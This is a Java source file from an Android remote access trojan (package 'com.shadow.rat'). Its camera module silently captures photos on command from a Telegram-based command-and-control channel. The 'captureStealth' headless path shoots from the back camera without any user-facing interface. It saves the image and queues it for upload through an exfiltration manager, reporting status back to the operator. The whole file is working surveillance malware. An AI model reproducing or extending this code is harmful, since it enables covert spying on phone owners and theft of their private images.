package com.shadow.rat.modules;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.MediaStore;
import android.util.Log;
import android.view.Surface;
import android.view.SurfaceTexture;
import androidx.core.content.ContextCompat;
import com.shadow.rat.c2.TelegramC2Manager;
import com.shadow.rat.exfiltration.ExfiltrationManager;
import com.shadow.rat.utils.Logger;
import com.shadow.rat.utils.ThreadPoolManager;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private final Context context;
    private final TelegramC2Manager c2Manager;
    private final ExfiltrationManager exfiltrationManager;
    private final AtomicBoolean isCapturing = new AtomicBoolean(false);
    
    private CameraManager cameraManager;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    
    public CameraModule(Context context) {
        this.context = context;
        this.c2Manager = TelegramC2Manager.getInstance(context);
        this.exfiltrationManager = ExfiltrationManager.getInstance(context);
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        
        setupBackgroundThread();
    }
    
    private void setupBackgroundThread() {
        backgroundThread = new HandlerThread("CameraModule");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
    
    public void capture(String args) {
        ThreadPoolManager.getExecutorService().execute(() -> {
            try {
                // Check permission
                if (!hasPermission(Manifest.permission.CAMERA)) {
                    c2Manager.sendMessage("❌ CAMERA permission not granted");
                    return;
                }
                
                // Android 12+ privacy indicator notification
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    c2Manager.sendMessage("📷 Camera access will show privacy indicator");
                }
                
                // Try headless capture first (Android 10+)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    captureHeadless();
                } else {
                    // Fallback to intent-based for older versions
                    captureWithIntent();
                }
                
            } catch (Exception e) {
                Logger.e(TAG, "Camera capture failed", e);
                c2Manager.sendMessage("❌ Camera failed: " + e.getMessage());
            }
        });
    }
    
    public void captureStealth(String args) {
        // Stealth mode - only works with Camera2 API
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            c2Manager.sendMessage("❌ Stealth mode requires Android 5.0+");
            return;
        }
        
        ThreadPoolManager.getExecutorService().execute(() -> {
            if (!hasPermission(Manifest.permission.CAMERA)) {
                c2Manager.sendMessage("❌ CAMERA permission not granted");
                return;
            }
            
            captureHeadless();
        });
    }
    
    private void captureHeadless() {
        if (isCapturing.get()) {
            c2Manager.sendMessage("⚠️ Camera already in use");
            return;
        }
        
        isCapturing.set(true);
        
        try {
            String cameraId = getBackCameraId();
            if (cameraId == null) {
                c2Manager.sendMessage("❌ No back camera available");
                return;
            }
            
            // Setup ImageReader
            imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 2);
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = reader.acquireLatestImage();
                if (image != null) {
                    try {
                        processImage(image);
                    } catch (Exception e) {
                        Logger.e(TAG, "Image processing failed", e);
                    } finally {
                        image.close();
                    }
                }
            }, backgroundHandler);
            
            // Open camera
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    startCaptureSession();
                }
                
                @Override
                public void onDisconnected(CameraDevice camera) {
                    camera.close();
                    isCapturing.set(false);
                }
                
                @Override
                public void onError(CameraDevice camera, int error) {
                    camera.close();
                    isCapturing.set(false);
                    c2Manager.sendMessage("❌ Camera error: " + error);
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Logger.e(TAG, "Headless capture failed", e);
            isCapturing.set(false);
            c2Manager.sendMessage("❌ Camera capture failed: " + e.getMessage());
        }
    }
    
    private void startCaptureSession() {
        try {
            cameraDevice.createCaptureSession(
                Collections.singletonList(imageReader.getSurface()),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(CameraCaptureSession session) {
                        captureImage(session);
                    }
                    
                    @Override
                    public void onConfigureFailed(CameraCaptureSession session) {
                        isCapturing.set(false);
                        c2Manager.sendMessage("❌ Camera session configuration failed");
                    }
                },
                backgroundHandler
            );
        } catch (Exception e) {
            Logger.e(TAG, "Failed to create capture session", e);
            isCapturing.set(false);
            c2Manager.sendMessage("❌ Session creation failed: " + e.getMessage());
        }
    }
    
    private void captureImage(CameraCaptureSession session) {
        try {
            CaptureRequest.Builder builder = cameraDevice.createCaptureRequest(
                CameraDevice.TEMPLATE_STILL_CAPTURE);
            builder.addTarget(imageReader.getSurface());
            builder.set(CaptureRequest.CONTROL_AF_MODE, 
                CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            builder.set(CaptureRequest.CONTROL_AE_MODE, 
                CaptureRequest.CONTROL_AE_MODE_ON_AUTO_FLASH);
            
            session.capture(builder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(CameraCaptureSession session, 
                                               CaptureRequest request, 
                                               TotalCaptureResult result) {
                    super.onCaptureCompleted(session, request, result);
                    // Success - image will be processed by ImageReader callback
                    session.close();
                    if (cameraDevice != null) {
                        cameraDevice.close();
                        cameraDevice = null;
                    }
                    isCapturing.set(false);
                }
            }, backgroundHandler);
            
        } catch (Exception e) {
            Logger.e(TAG, "Image capture failed", e);
            isCapturing.set(false);
            c2Manager.sendMessage("❌ Capture failed: " + e.getMessage());
        }
    }
    
    private void processImage(Image image) {
        try {
            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            byte[] imageData = new byte[buffer.remaining()];
            buffer.get(imageData);
            
            // Generate filename with timestamp
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", 
                Locale.US).format(new Date());
            String fileName = "camera_" + timestamp + ".jpg";
            String filePath = context.getExternalFilesDir(null).getAbsolutePath() 
                + "/" + fileName;
            
            // Save image
            FileOutputStream fos = new FileOutputStream(filePath);
            fos.write(imageData);
            fos.close();
            
            // Notify and upload
            c2Manager.sendMessage("📸 Image captured: " + fileName);
            
            // Queue for upload
            exfiltrationManager.queueFileUpload(filePath, "image/jpeg");
            
        } catch (Exception e) {
            Logger.e(TAG, "Image processing failed", e);
        }
    }
    
    private void captureWithIntent() {
        try {
            Intent cameraIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            cameraIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(cameraIntent);
            c2Manager.sendMessage("📷 Camera opened (intent mode)");
        } catch (Exception e) {
            Logger.e(TAG, "Intent camera failed", e);
            c2Manager.sendMessage("❌ Camera intent failed: " + e.getMessage());
        }
    }
    
    private String getBackCameraId() {
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            for (String id : cameraIds) {
                CameraCharacteristics characteristics = 
                    cameraManager.getCameraCharacteristics(id);
                Integer lensFacing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (lensFacing != null && 
                    lensFacing == CameraCharacteristics.LENS_FACING_BACK) {
                    return id;
                }
            }
            return cameraIds.length > 0 ? cameraIds[0] : null;
        } catch (Exception e) {
            return null;
        }
    }
    
    private boolean hasPermission(String permission) {
        return ContextCompat.checkSelfPermission(context, permission) 
            == PackageManager.PERMISSION_GRANTED;
    }
    
    public void shutdown() {
        isCapturing.set(false);
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
}